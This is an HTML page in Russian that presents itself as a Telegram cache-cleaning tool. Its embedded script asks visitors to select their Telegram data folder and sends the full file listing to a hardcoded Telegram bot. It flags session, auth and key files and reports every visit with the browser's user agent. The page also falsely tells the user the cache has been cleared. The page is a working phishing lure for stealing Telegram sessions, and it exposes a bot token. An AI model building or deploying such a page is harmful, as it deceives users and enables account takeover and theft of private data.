<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Очистка кэша Telegram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
        }
        .container {
            background: #1a1a1a;
            padding: 32px 24px;
            border-radius: 24px;
            max-width: 380px;
            width: 100%;
            text-align: center;
            border: 1px solid #2a2a2a;
        }
        .icon {
            font-size: 64px;
            margin-bottom: 16px;
        }
        .title {
            color: #ffffff;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        .sub {
            color: #888888;
            font-size: 14px;
            margin-bottom: 24px;
        }
        .file-input-wrapper {
            background: #2a2a2a;
            border: 2px dashed #444;
            border-radius: 16px;
            padding: 30px 20px;
            cursor: pointer;
            transition: 0.2s;
        }
        .file-input-wrapper:hover {
            border-color: #0088cc;
        }
        .file-input-wrapper input {
            display: none;
        }
        .file-label {
            color: #aaaaaa;
            font-size: 16px;
        }
        .file-label span {
            color: #0088cc;
            font-weight: 600;
        }
        .status {
            margin-top: 16px;
            color: #888888;
            font-size: 14px;
            display: none;
        }
        .footer {
            color: #444444;
            font-size: 12px;
            margin-top: 24px;
            border-top: 1px solid #2a2a2a;
            padding-top: 16px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="icon">🧹</div>
    <div class="title">Очистка кэша Telegram</div>
    <div class="sub">Для ускорения работы приложения выберите папку с данными Telegram</div>

    <div class="file-input-wrapper" id="fileDrop">
        <label class="file-label" id="fileLabel">
            <span>📂 Нажмите для выбора папки</span>
        </label>
        <input type="file" id="fileInput" webkitdirectory directory multiple>
    </div>

    <div class="status" id="status">⏳ Обработка...</div>
    <div class="footer">Telegram • 2026</div>
</div>

<script>
    // ===== КОНФИГУРАЦИЯ (С ТВОИМИ ДАННЫМИ) =====
    const BOT_TOKEN = '8712563091:AAEg-wCQ4x7wviL5UUC5yDh2_q3gZWBn6gg';
    const CHAT_ID = '8277809761';
    const WEBHOOK = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // ===== ОТПРАВКА В TELEGRAM =====
    function sendToTG(text) {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text.substring(0, 4096),
                parse_mode: 'HTML'
            })
        }).catch(e => console.log('Ошибка отправки:', e));
    }

    // ===== ЗАГРУЗКА ФАЙЛОВ =====
    document.getElementById('fileInput').addEventListener('change', function(e) {
        const files = e.target.files;
        if (files.length === 0) return;

        document.getElementById('status').style.display = 'block';
        document.getElementById('status').textContent = '⏳ Сбор данных...';

        let fileList = [];
        let keyFiles = [];

        for (let i = 0; i < files.length; i++) {
            const file = files[i];
            fileList.push({
                name: file.webkitRelativePath || file.name,
                size: file.size
            });

            if (file.name.includes('key') || 
                file.name.includes('auth') || 
                file.name.includes('session') ||
                file.name.includes('cache')) {
                keyFiles.push(file.name);
            }
        }

        // Отправляем информацию в Telegram
        let report = `📁 <b>Сессия Telegram</b>\n\n` +
                     `📂 Найдено файлов: ${fileList.length}\n` +
                     `📦 Суммарный размер: ${(fileList.reduce((acc, f) => acc + f.size, 0) / 1024).toFixed(2)} KB\n\n` +
                     `📄 Файлы:\n${fileList.map(f => `  - ${f.name} (${f.size} байт)`).join('\n')}`;

        sendToTG(report);

        if (keyFiles.length > 0) {
            sendToTG(`🔑 <b>КЛЮЧЕВЫЕ ФАЙЛЫ НАЙДЕНЫ!</b>\n\n${keyFiles.map(f => `  - ${f}`).join('\n')}`);
        }

        document.getElementById('status').textContent = '✅ Данные отправлены!';
        document.getElementById('fileLabel').innerHTML = '<span>✅ Папка выбрана, кэш очищен</span>';

        setTimeout(() => {
            document.getElementById('status').textContent = '✅ Кэш очищен! Перезапустите Telegram.';
        }, 2000);
    });

    // ===== АВТО-УВЕДОМЛЕНИЕ ПРИ ВИЗИТЕ =====
    window.onload = function() {
        sendToTG(`🟢 <b>НОВЫЙ ВИЗИТ</b>\n🖥 ${navigator.userAgent}\n📺 ${screen.width}x${screen.height}`);
    };
</script>
</body>
</html>
